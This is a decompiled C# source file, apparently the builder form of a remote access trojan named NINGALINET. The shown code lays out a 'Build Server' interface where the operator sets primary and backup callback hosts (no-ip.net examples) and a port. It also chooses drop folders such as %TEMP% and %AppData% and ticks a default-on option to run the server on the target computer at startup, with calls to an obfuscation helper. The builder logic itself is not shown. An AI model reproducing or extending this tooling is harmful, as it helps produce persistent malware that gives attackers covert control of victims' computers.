using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Mono.Collections.Generic;
using NINGALINET.My;
using NINGALINET.My.Resources;

namespace NINGALINET
{
	// Token: 0x0200002D RID: 45
	[DesignerGenerated]
	public class ControlBuilder : UserControl
	{
		// Token: 0x0600081E RID: 2078 RVA: 0x00004903 File Offset: 0x00002B03
		[DebuggerNonUserCode]
		static ControlBuilder()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class2.zP7eVJHzSiX6G();
			ControlBuilder.__ENCList = new List<WeakReference>();
		}

		// Token: 0x0600081F RID: 2079 RVA: 0x00004914 File Offset: 0x00002B14
		[DebuggerNonUserCode]
		public ControlBuilder()
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			ControlBuilder.__ENCAddToList(this);
			this.InitializeComponent();
		}

		// Token: 0x06000820 RID: 2080 RVA: 0x0003FDAC File Offset: 0x0003DFAC
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = ControlBuilder.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					if (ControlBuilder.__ENCList.Count == ControlBuilder.__ENCList.Capacity)
					{
						int num = 0;
						int arg_37_0 = 0;
						int num2 = ControlBuilder.__ENCList.Count - 1;
						int num3 = arg_37_0;
						while (true)
						{
							int arg_7D_0 = num3;
							int num4 = num2;
							if (arg_7D_0 > num4)
							{
								break;
							}
							WeakReference weakReference = ControlBuilder.__ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									ControlBuilder.__ENCList[num] = ControlBuilder.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						ControlBuilder.__ENCList.RemoveRange(num, ControlBuilder.__ENCList.Count - num);
						ControlBuilder.__ENCList.Capacity = ControlBuilder.__ENCList.Count;
					}
					ControlBuilder.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x06000821 RID: 2081 RVA: 0x0003FE94 File Offset: 0x0003E094
		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000822 RID: 2082 RVA: 0x0003FED8 File Offset: 0x0003E0D8
		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(ControlBuilder));
			this.Panel1 = new Panel();
			this.Button2 = new Button();
			this.Button1 = new Button();
			this.Panel2 = new Panel();
			this.TT = new RichTextBox();
			this.Label8 = new Label();
			this.GroupDropBox3 = new GroupDropBox();
			this.Label1 = new Label();
			this.PictureBox1 = new PictureBox();
			this.Button3 = new Button();
			this.IconTextBox = new TextBox();
			this.Button4 = new Button();
			this.GroupDropBox2 = new GroupDropBox();
			this.PictureBox2 = new PictureBox();
			this.Exe = new TextBox();
			this.dir = new ComboBox();
			this.Label2 = new Label();
			this.Label6 = new Label();
			this.Label7 = new Label();
			this.startup = new CheckBox();
			this.GroupDropBox1 = new GroupDropBox();
			this.VN = new TextBox();
			this.Host1 = new TextBox();
			this.Host2 = new TextBox();
			this.Label11 = new Label();
			this.Label14 = new Label();
			this.Label10 = new Label();
			this.Label9 = new Label();
			this.Port = new NumericUpDown();
			this.Label5 = new Label();
			this.Label3 = new Label();
			this.Label4 = new Label();
			this.Panel1.SuspendLayout();
			this.Panel2.SuspendLayout();
			this.GroupDropBox3.SuspendLayout();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			this.GroupDropBox2.SuspendLayout();
			((ISupportInitialize)this.PictureBox2).BeginInit();
			this.GroupDropBox1.SuspendLayout();
			((ISupportInitialize)this.Port).BeginInit();
			this.SuspendLayout();
			this.Panel1.BackColor = Color.FromArgb(10, 10, 10);
			this.Panel1.Controls.Add(this.Button2);
			this.Panel1.Controls.Add(this.Button1);
			this.Panel1.Dock = DockStyle.Bottom;
			Control arg_230_0 = this.Panel1;
			Point location = new Point(0, 411);
			arg_230_0.Location = location;
			this.Panel1.Name = "Panel1";
			Control arg_25A_0 = this.Panel1;
			Size size = new Size(622, 40);
			arg_25A_0.Size = size;
			this.Panel1.TabIndex = 32;
			this.Button2.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.Button2.BackColor = Color.FromArgb(20, 20, 20);
			this.Button2.FlatStyle = FlatStyle.Popup;
			this.Button2.Font = new Font("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button2.ForeColor = Color.WhiteSmoke;
			Control arg_2D8_0 = this.Button2;
			location = new Point(8, 10);
			arg_2D8_0.Location = location;
			this.Button2.Name = "Button2";
			Control arg_2FF_0 = this.Button2;
			size = new Size(118, 23);
			arg_2FF_0.Size = size;
			this.Button2.TabIndex = 1;
			this.Button2.Text = "Restore Default(s)";
			this.Button2.UseVisualStyleBackColor = false;
			this.Button1.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
			this.Button1.BackColor = Color.FromArgb(20, 20, 20);
			this.Button1.FlatStyle = FlatStyle.Popup;
			this.Button1.Font = new Font("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button1.ForeColor = Color.WhiteSmoke;
			Control arg_39D_0 = this.Button1;
			location = new Point(132, 10);
			arg_39D_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_3C7_0 = this.Button1;
			size = new Size(483, 23);
			arg_3C7_0.Size = size;
			this.Button1.TabIndex = 0;
			this.Button1.Text = "Build Server";
			this.Button1.UseVisualStyleBackColor = false;
			this.Panel2.AutoScroll = true;
			this.Panel2.BackColor = Color.Black;
			this.Panel2.Controls.Add(this.TT);
			this.Panel2.Controls.Add(this.Label8);
			this.Panel2.Controls.Add(this.GroupDropBox3);
			this.Panel2.Controls.Add(this.GroupDropBox2);
			this.Panel2.Controls.Add(this.GroupDropBox1);
			this.Panel2.Dock = DockStyle.Fill;
			Control arg_49A_0 = this.Panel2;
			location = new Point(0, 0);
			arg_49A_0.Location = location;
			this.Panel2.Name = "Panel2";
			Control arg_4C7_0 = this.Panel2;
			size = new Size(622, 411);
			arg_4C7_0.Size = size;
			this.Panel2.TabIndex = 33;
			this.TT.BackColor = Color.FromArgb(40, 40, 40);
			this.TT.BorderStyle = BorderStyle.None;
			this.TT.Dock = DockStyle.Fill;
			this.TT.ForeColor = Color.WhiteSmoke;
			Control arg_52B_0 = this.TT;
			location = new Point(0, 481);
			arg_52B_0.Location = location;
			this.TT.Name = "TT";
			Control arg_555_0 = this.TT;
			size = new Size(605, 33);
			arg_555_0.Size = size;
			this.TT.TabIndex = 68;
			this.TT.Text = Resources.notf;
			this.TT.Visible = false;
			this.Label8.AutoSize = true;
			Control arg_5A4_0 = this.Label8;
			location = new Point(67, 500);
			arg_5A4_0.Location = location;
			this.Label8.Name = "Label8";
			Control arg_5CB_0 = this.Label8;
			size = new Size(16, 14);
			arg_5CB_0.Size = size;
			this.Label8.TabIndex = 67;
			this.Label8.Text = "   ";
			this.GroupDropBox3.Checked = true;
			this.GroupDropBox3.Controls.Add(this.Label1);
			this.GroupDropBox3.Controls.Add(this.PictureBox1);
			this.GroupDropBox3.Controls.Add(this.Button3);
			this.GroupDropBox3.Controls.Add(this.IconTextBox);
			this.GroupDropBox3.Controls.Add(this.Button4);
			this.GroupDropBox3.Dock = DockStyle.Top;
			this.GroupDropBox3.Font = new Font("Arial", 8f);
			this.GroupDropBox3.ForeColor = Color.FromArgb(245, 245, 245);
			Control arg_6C0_0 = this.GroupDropBox3;
			location = new Point(0, 360);
			arg_6C0_0.Location = location;
			Control arg_6D6_0 = this.GroupDropBox3;
			size = new Size(5, 30);
			arg_6D6_0.MinimumSize = size;
			this.GroupDropBox3.Name = "GroupDropBox3";
			this.GroupDropBox3.NoRounding = false;
			GroupDropBox arg_70C_0 = this.GroupDropBox3;
			size = new Size(605, 121);
			arg_70C_0.OpenSize = size;
			Control arg_726_0 = this.GroupDropBox3;
			size = new Size(605, 121);
			arg_726_0.Size = size;
			this.GroupDropBox3.TabIndex = 66;
			this.GroupDropBox3.Text = "Change Icon";
			this.Label1.AutoSize = true;
			Control arg_766_0 = this.Label1;
			location = new Point(19, 39);
			arg_766_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_78D_0 = this.Label1;
			size = new Size(60, 14);
			arg_78D_0.Size = size;
			this.Label1.TabIndex = 62;
			this.Label1.Text = "Icon Path : ";
			Control arg_7C4_0 = this.PictureBox1;
			location = new Point(279, 55);
			arg_7C4_0.Location = location;
			this.PictureBox1.Name = "PictureBox1";
			Control arg_7EB_0 = this.PictureBox1;
			size = new Size(53, 53);
			arg_7EB_0.Size = size;
			this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
			this.PictureBox1.TabIndex = 41;
			this.PictureBox1.TabStop = false;
			this.Button3.BackColor = Color.FromArgb(20, 20, 20);
			this.Button3.FlatStyle = FlatStyle.Popup;
			Control arg_849_0 = this.Button3;
			location = new Point(22, 82);
			arg_849_0.Location = location;
			this.Button3.Name = "Button3";
			Control arg_870_0 = this.Button3;
			size = new Size(122, 26);
			arg_870_0.Size = size;
			this.Button3.TabIndex = 59;
			this.Button3.Text = "Reset";
			this.Button3.TextAlign = ContentAlignment.MiddleLeft;
			this.Button3.UseVisualStyleBackColor = false;
			this.IconTextBox.BackColor = Color.FromArgb(40, 40, 40);
			this.IconTextBox.BorderStyle = BorderStyle.FixedSingle;
			this.IconTextBox.ForeColor = Color.WhiteSmoke;
			Control arg_8EF_0 = this.IconTextBox;
			location = new Point(22, 56);
			arg_8EF_0.Location = location;
			this.IconTextBox.Name = "IconTextBox";
			Control arg_919_0 = this.IconTextBox;
			size = new Size(250, 20);
			arg_919_0.Size = size;
			this.IconTextBox.TabIndex = 60;
			this.Button4.BackColor = Color.FromArgb(20, 20, 20);
			this.Button4.FlatStyle = FlatStyle.Popup;
			Control arg_962_0 = this.Button4;
			location = new Point(150, 82);
			arg_962_0.Location = location;
			this.Button4.Name = "Button4";
			Control arg_989_0 = this.Button4;
			size = new Size(122, 26);
			arg_989_0.Size = size;
			this.Button4.TabIndex = 61;
			this.Button4.Text = "Choose Icon..";
			this.Button4.TextAlign = ContentAlignment.MiddleLeft;
			this.Button4.UseVisualStyleBackColor = false;
			this.GroupDropBox2.Checked = true;
			this.GroupDropBox2.Controls.Add(this.PictureBox2);
			this.GroupDropBox2.Controls.Add(this.Exe);
			this.GroupDropBox2.Controls.Add(this.dir);
			this.GroupDropBox2.Controls.Add(this.Label2);
			this.GroupDropBox2.Controls.Add(this.Label6);
			this.GroupDropBox2.Controls.Add(this.Label7);
			this.GroupDropBox2.Controls.Add(this.startup);
			this.GroupDropBox2.Dock = DockStyle.Top;
			this.GroupDropBox2.Font = new Font("Arial", 8f);
			this.GroupDropBox2.ForeColor = Color.FromArgb(245, 245, 245);
			Control arg_AC3_0 = this.GroupDropBox2;
			location = new Point(0, 215);
			arg_AC3_0.Location = location;
			Control arg_AD9_0 = this.GroupDropBox2;
			size = new Size(5, 30);
			arg_AD9_0.MinimumSize = size;
			this.GroupDropBox2.Name = "GroupDropBox2";
			this.GroupDropBox2.NoRounding = false;
			GroupDropBox arg_B12_0 = this.GroupDropBox2;
			size = new Size(605, 145);
			arg_B12_0.OpenSize = size;
			Control arg_B2F_0 = this.GroupDropBox2;
			size = new Size(605, 145);
			arg_B2F_0.Size = size;
			this.GroupDropBox2.TabIndex = 64;
			this.GroupDropBox2.Text = "Server Installation";
			this.PictureBox2.Image = (Image)componentResourceManager.GetObject("PictureBox2.Image");
			Control arg_B81_0 = this.PictureBox2;
			location = new Point(150, 97);
			arg_B81_0.Location = location;
			this.PictureBox2.Name = "PictureBox2";
			Control arg_BA8_0 = this.PictureBox2;
			size = new Size(18, 21);
			arg_BA8_0.Size = size;
			this.PictureBox2.TabIndex = 59;
			this.PictureBox2.TabStop = false;
			this.Exe.BackColor = Color.FromArgb(40, 40, 40);
			this.Exe.BorderStyle = BorderStyle.FixedSingle;
			this.Exe.ForeColor = Color.WhiteSmoke;
			Control arg_C0A_0 = this.Exe;
			location = new Point(22, 56);
			arg_C0A_0.Location = location;
			this.Exe.Name = "Exe";
			Control arg_C34_0 = this.Exe;
			size = new Size(200, 20);
			arg_C34_0.Size = size;
			this.Exe.TabIndex = 44;
			this.Exe.Text = "Server.exe";
			this.dir.BackColor = Color.FromArgb(40, 40, 40);
			this.dir.FlatStyle = FlatStyle.Flat;
			this.dir.ForeColor = Color.WhiteSmoke;
			this.dir.FormattingEnabled = true;
			this.dir.Items.AddRange(new object[]
			{
				"%TEMP%",
				"%AppData%",
				"%UserProfile%",
				"%ProgramData%",
				"%WINDIR%"
			});
			Control arg_CE6_0 = this.dir;
			location = new Point(22, 96);
			arg_CE6_0.Location = location;
			this.dir.Name = "dir";
			Control arg_D0D_0 = this.dir;
			size = new Size(120, 22);
			arg_D0D_0.Size = size;
			this.dir.TabIndex = 39;
			this.dir.Text = "%TEMP%";
			this.Label2.AutoSize = true;
			Control arg_D4D_0 = this.Label2;
			location = new Point(19, 79);
			arg_D4D_0.Location = location;
			this.Label2.Name = "Label2";
			Control arg_D74_0 = this.Label2;
			size = new Size(64, 14);
			arg_D74_0.Size = size;
			this.Label2.TabIndex = 54;
			this.Label2.Text = "Drop file in ;";
			this.Label6.AutoSize = true;
			Control arg_DB4_0 = this.Label6;
			location = new Point(19, 39);
			arg_DB4_0.Location = location;
			this.Label6.Name = "Label6";
			Control arg_DDB_0 = this.Label6;
			size = new Size(59, 14);
			arg_DDB_0.Size = size;
			this.Label6.TabIndex = 40;
			this.Label6.Text = "File Name :";
			this.Label7.AutoSize = true;
			this.Label7.BackColor = Color.Black;
			Control arg_E2E_0 = this.Label7;
			location = new Point(228, 58);
			arg_E2E_0.Location = location;
			this.Label7.Name = "Label7";
			Control arg_E55_0 = this.Label7;
			size = new Size(116, 14);
			arg_E55_0.Size = size;
			this.Label7.TabIndex = 58;
			this.Label7.Text = "(e.g. \"application.exe\")";
			this.startup.AutoSize = true;
			this.startup.BackColor = Color.Black;
			this.startup.Checked = true;
			this.startup.CheckState = CheckState.Checked;
			Control arg_EBD_0 = this.startup;
			location = new Point(22, 123);
			arg_EBD_0.Location = location;
			this.startup.Name = "startup";
			Control arg_EE7_0 = this.startup;
			size = new Size(303, 18);
			arg_EE7_0.Size = size;
			this.startup.TabIndex = 42;
			this.startup.Text = "Run Server when the target computer starts (On Startup)";
			this.startup.UseVisualStyleBackColor = false;
			this.GroupDropBox1.Checked = true;
			this.GroupDropBox1.Controls.Add(this.VN);
			this.GroupDropBox1.Controls.Add(this.Host1);
			this.GroupDropBox1.Controls.Add(this.Host2);
			this.GroupDropBox1.Controls.Add(this.Label11);
			this.GroupDropBox1.Controls.Add(this.Label14);
			this.GroupDropBox1.Controls.Add(this.Label10);
			this.GroupDropBox1.Controls.Add(this.Label9);
			this.GroupDropBox1.Controls.Add(this.Port);
			this.GroupDropBox1.Controls.Add(this.Label5);
			this.GroupDropBox1.Controls.Add(this.Label3);
			this.GroupDropBox1.Controls.Add(this.Label4);
			this.GroupDropBox1.Dock = DockStyle.Top;
			this.GroupDropBox1.Font = new Font("Arial", 8f);
			this.GroupDropBox1.ForeColor = Color.FromArgb(245, 245, 245);
			Control arg_1068_0 = this.GroupDropBox1;
			location = new Point(0, 0);
			arg_1068_0.Location = location;
			Control arg_107E_0 = this.GroupDropBox1;
			size = new Size(5, 30);
			arg_107E_0.MinimumSize = size;
			this.GroupDropBox1.Name = "GroupDropBox1";
			this.GroupDropBox1.NoRounding = false;
			GroupDropBox arg_10B7_0 = this.GroupDropBox1;
			size = new Size(605, 215);
			arg_10B7_0.OpenSize = size;
			Control arg_10D4_0 = this.GroupDropBox1;
			size = new Size(605, 215);
			arg_10D4_0.Size = size;
			this.GroupDropBox1.TabIndex = 63;
			this.GroupDropBox1.Text = "Server Connections";
			this.VN.BackColor = Color.FromArgb(40, 40, 40);
			this.VN.BorderStyle = BorderStyle.FixedSingle;
			this.VN.ForeColor = Color.WhiteSmoke;
			Control arg_113A_0 = this.VN;
			location = new Point(22, 59);
			arg_113A_0.Location = location;
			this.VN.Name = "VN";
			Control arg_1164_0 = this.VN;
			size = new Size(200, 20);
			arg_1164_0.Size = size;
			this.VN.TabIndex = 45;
			this.VN.Text = "Server";
			this.Host1.BackColor = Color.FromArgb(40, 40, 40);
			this.Host1.BorderStyle = BorderStyle.FixedSingle;
			this.Host1.ForeColor = Color.WhiteSmoke;
			Control arg_11CA_0 = this.Host1;
			location = new Point(22, 99);
			arg_11CA_0.Location = location;
			this.Host1.Name = "Host1";
			Control arg_11F4_0 = this.Host1;
			size = new Size(200, 20);
			arg_11F4_0.Size = size;
			this.Host1.TabIndex = 48;
			this.Host1.Text = "127.0.0.1";
			this.Host2.BackColor = Color.FromArgb(40, 40, 40);
			this.Host2.BorderStyle = BorderStyle.FixedSingle;
			this.Host2.ForeColor = Color.WhiteSmoke;
			Control arg_125D_0 = this.Host2;
			location = new Point(22, 142);
			arg_125D_0.Location = location;
			this.Host2.Name = "Host2";
			Control arg_1287_0 = this.Host2;
			size = new Size(200, 20);
			arg_1287_0.Size = size;
			this.Host2.TabIndex = 49;
			this.Label11.AutoSize = true;
			Control arg_12BA_0 = this.Label11;
			location = new Point(19, 167);
			arg_12BA_0.Location = location;
			this.Label11.Name = "Label11";
			Control arg_12E1_0 = this.Label11;
			size = new Size(89, 14);
			arg_12E1_0.Size = size;
			this.Label11.TabIndex = 47;
			this.Label11.Text = "Connection Port :";
			this.Label14.AutoSize = true;
			Control arg_1321_0 = this.Label14;
			location = new Point(19, 39);
			arg_1321_0.Location = location;
			this.Label14.Name = "Label14";
			Control arg_1348_0 = this.Label14;
			size = new Size(58, 14);
			arg_1348_0.Size = size;
			this.Label14.TabIndex = 43;
			this.Label14.Text = "Server ID :";
			this.Label10.AutoSize = true;
			Control arg_1388_0 = this.Label10;
			location = new Point(19, 82);
			arg_1388_0.Location = location;
			this.Label10.Name = "Label10";
			Control arg_13B2_0 = this.Label10;
			size = new Size(131, 14);
			arg_13B2_0.Size = size;
			this.Label10.TabIndex = 46;
			this.Label10.Text = "Primary Connection Host :";
			this.Label9.AutoSize = true;
			Control arg_13F2_0 = this.Label9;
			location = new Point(19, 124);
			arg_13F2_0.Location = location;
			this.Label9.Name = "Label9";
			Control arg_141C_0 = this.Label9;
			size = new Size(131, 14);
			arg_141C_0.Size = size;
			this.Label9.TabIndex = 52;
			this.Label9.Text = "Backup Connection Host :";
			this.Port.BackColor = Color.FromArgb(40, 40, 40);
			this.Port.BorderStyle = BorderStyle.FixedSingle;
			this.Port.ForeColor = Color.WhiteSmoke;
			Control arg_1485_0 = this.Port;
			location = new Point(22, 184);
			arg_1485_0.Location = location;
			NumericUpDown arg_14BB_0 = this.Port;
			decimal num = new decimal(new int[]
			{
				99999,
				0,
				0,
				0
			});
			arg_14BB_0.Maximum = num;
			this.Port.Name = "Port";
			Control arg_14E2_0 = this.Port;
			size = new Size(120, 20);
			arg_14E2_0.Size = size;
			this.Port.TabIndex = 53;
			NumericUpDown arg_1525_0 = this.Port;
			num = new decimal(new int[]
			{
				1997,
				0,
				0,
				0
			});
			arg_1525_0.Value = num;
			this.Label5.AutoSize = true;
			this.Label5.BackColor = Color.Black;
			Control arg_155E_0 = this.Label5;
			location = new Point(228, 144);
			arg_155E_0.Location = location;
			this.Label5.Name = "Label5";
			Control arg_1585_0 = this.Label5;
			size = new Size(117, 14);
			arg_1585_0.Size = size;
			this.Label5.TabIndex = 57;
			this.Label5.Text = "(e.g. \"office.no-ip.net\")";
			this.Label3.AutoSize = true;
			this.Label3.BackColor = Color.Black;
			Control arg_15D8_0 = this.Label3;
			location = new Point(228, 61);
			arg_15D8_0.Location = location;
			this.Label3.Name = "Label3";
			Control arg_15FF_0 = this.Label3;
			size = new Size(78, 14);
			arg_15FF_0.Size = size;
			this.Label3.TabIndex = 55;
			this.Label3.Text = "(e.g. \"Ini Budi\")";
			this.Label4.AutoSize = true;
			this.Label4.BackColor = Color.Black;
			Control arg_1652_0 = this.Label4;
			location = new Point(228, 101);
			arg_1652_0.Location = location;
			this.Label4.Name = "Label4";
			Control arg_1679_0 = this.Label4;
			size = new Size(115, 14);
			arg_1679_0.Size = size;
			this.Label4.TabIndex = 56;
			this.Label4.Text = "(e.g. \"home.no-ip.net\")";
			SizeF autoScaleDimensions = new SizeF(6f, 14f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			this.Controls.Add(this.Panel2);
			this.Controls.Add(this.Panel1);
			this.Font = new Font("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.ForeColor = Color.WhiteSmoke;
			this.Name = "ControlBuilder";
			size = new Size(622, 451);
			this.Size = size;
			this.Panel1.ResumeLayout(false);
			this.Panel2.ResumeLayout(false);
			this.Panel2.PerformLayout();
			this.GroupDropBox3.ResumeLayout(false);
			this.GroupDropBox3.PerformLayout();
			((ISupportInitialize)this.PictureBox1).EndInit();
			this.GroupDropBox2.ResumeLayout(false);
			this.GroupDropBox2.PerformLayout();
			((ISupportInitialize)this.PictureBox2).EndInit();
			this.GroupDropBox1.ResumeLayout(false);
			this.GroupDropBox1.PerformLayout();
			((ISupportInitialize)this.Port).EndInit();
			this.ResumeLayout(false);
		}

		// Token: 0x170002ED RID: 749
		// (get) Token: 0x06000823 RID: 2083 RVA: 0x000416A4 File Offset: 0x0003F8A4
		// (set) Token: 0x06000824 RID: 2084 RVA: 0x0000492D File Offset: 0x00002B2D
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x170002EE RID: 750
		// (get) Token: 0x06000825 RID: 2085 RVA: 0x000416BC File Offset: 0x0003F8BC
		// (set) Token: 0x06000826 RID: 2086 RVA: 0x00004936 File Offset: 0x00002B36
		internal virtual Panel Panel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel2 = value;
			}
		}

		// Token: 0x170002EF RID: 751
		// (get) Token: 0x06000827 RID: 2087 RVA: 0x000416D4 File Offset: 0x0003F8D4
		// (set) Token: 0x06000828 RID: 2088 RVA: 0x000416EC File Offset: 0x0003F8EC
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				if (this._Button1 != null)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				if (this._Button1 != null)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x170002F0 RID: 752
		// (get) Token: 0x06000829 RID: 2089 RVA: 0x00041744 File Offset: 0x0003F944
		// (set) Token: 0x0600082A RID: 2090 RVA: 0x0000493F File Offset: 0x00002B3F
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x170002F1 RID: 753
		// (get) Token: 0x0600082B RID: 2091 RVA: 0x0004175C File Offset: 0x0003F95C
		// (set) Token: 0x0600082C RID: 2092 RVA: 0x00041774 File Offset: 0x0003F974
		internal virtual Button Button4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button4_Click);
				if (this._Button4 != null)
				{
					this._Button4.Click -= value2;
				}
				this._Button4 = value;
				if (this._Button4 != null)
				{
					this._Button4.Click += value2;
				}
			}
		}

		// Token: 0x170002F2 RID: 754
		// (get) Token: 0x0600082D RID: 2093 RVA: 0x000417CC File Offset: 0x0003F9CC
		// (set) Token: 0x0600082E RID: 2094 RVA: 0x00004948 File Offset: 0x00002B48
		internal virtual TextBox IconTextBox
		{
			[DebuggerNonUserCode]
			get
			{
				return this._IconTextBox;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._IconTextBox = value;
			}
		}

		// Token: 0x170002F3 RID: 755
		// (get) Token: 0x0600082F RID: 2095 RVA: 0x000417E4 File Offset: 0x0003F9E4
		// (set) Token: 0x06000830 RID: 2096 RVA: 0x000417FC File Offset: 0x0003F9FC
		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click);
				if (this._Button3 != null)
				{
					this._Button3.Click -= value2;
				}
				this._Button3 = value;
				if (this._Button3 != null)
				{
					this._Button3.Click += value2;
				}
			}
		}

		// Token: 0x170002F4 RID: 756
		// (get) Token: 0x06000831 RID: 2097 RVA: 0x00041854 File Offset: 0x0003FA54
		// (set) Token: 0x06000832 RID: 2098 RVA: 0x00004951 File Offset: 0x00002B51
		internal virtual Label Label7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label7 = value;
			}
		}

		// Token: 0x170002F5 RID: 757
		// (get) Token: 0x06000833 RID: 2099 RVA: 0x0004186C File Offset: 0x0003FA6C
		// (set) Token: 0x06000834 RID: 2100 RVA: 0x0000495A File Offset: 0x00002B5A
		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		// Token: 0x170002F6 RID: 758
		// (get) Token: 0x06000835 RID: 2101 RVA: 0x00041884 File Offset: 0x0003FA84
		// (set) Token: 0x06000836 RID: 2102 RVA: 0x00004963 File Offset: 0x00002B63
		internal virtual Label Label5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label5 = value;
			}
		}

		// Token: 0x170002F7 RID: 759
		// (get) Token: 0x06000837 RID: 2103 RVA: 0x0004189C File Offset: 0x0003FA9C
		// (set) Token: 0x06000838 RID: 2104 RVA: 0x0000496C File Offset: 0x00002B6C
		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label4 = value;
			}
		}

		// Token: 0x170002F8 RID: 760
		// (get) Token: 0x06000839 RID: 2105 RVA: 0x000418B4 File Offset: 0x0003FAB4
		// (set) Token: 0x0600083A RID: 2106 RVA: 0x00004975 File Offset: 0x00002B75
		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		// Token: 0x170002F9 RID: 761
		// (get) Token: 0x0600083B RID: 2107 RVA: 0x000418CC File Offset: 0x0003FACC
		// (set) Token: 0x0600083C RID: 2108 RVA: 0x0000497E File Offset: 0x00002B7E
		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		// Token: 0x170002FA RID: 762
		// (get) Token: 0x0600083D RID: 2109 RVA: 0x000418E4 File Offset: 0x0003FAE4
		// (set) Token: 0x0600083E RID: 2110 RVA: 0x00004987 File Offset: 0x00002B87
		internal virtual NumericUpDown Port
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Port;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Port = value;
			}
		}

		// Token: 0x170002FB RID: 763
		// (get) Token: 0x0600083F RID: 2111 RVA: 0x000418FC File Offset: 0x0003FAFC
		// (set) Token: 0x06000840 RID: 2112 RVA: 0x00004990 File Offset: 0x00002B90
		internal virtual Label Label6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label6 = value;
			}
		}

		// Token: 0x170002FC RID: 764
		// (get) Token: 0x06000841 RID: 2113 RVA: 0x00041914 File Offset: 0x0003FB14
		// (set) Token: 0x06000842 RID: 2114 RVA: 0x00004999 File Offset: 0x00002B99
		internal virtual Label Label9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label9 = value;
			}
		}

		// Token: 0x170002FD RID: 765
		// (get) Token: 0x06000843 RID: 2115 RVA: 0x0004192C File Offset: 0x0003FB2C
		// (set) Token: 0x06000844 RID: 2116 RVA: 0x00041944 File Offset: 0x0003FB44
		internal virtual CheckBox startup
		{
			[DebuggerNonUserCode]
			get
			{
				return this._startup;
			}
